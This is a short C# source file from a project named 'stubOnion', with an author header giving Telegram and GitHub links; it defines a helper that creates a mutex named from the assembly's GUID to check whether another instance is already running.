/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace stubOnion
{
    internal static class MutEx
    {
        public static Mutex InCheckMutex;

        public static bool GetMutex()
        {
            InCheckMutex = new Mutex(true, ((GuidAttribute)Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(GuidAttribute), false).GetValue(0)).Value.ToString(), out bool isOK); //Мутекс 
            return isOK;
        }
    }
}
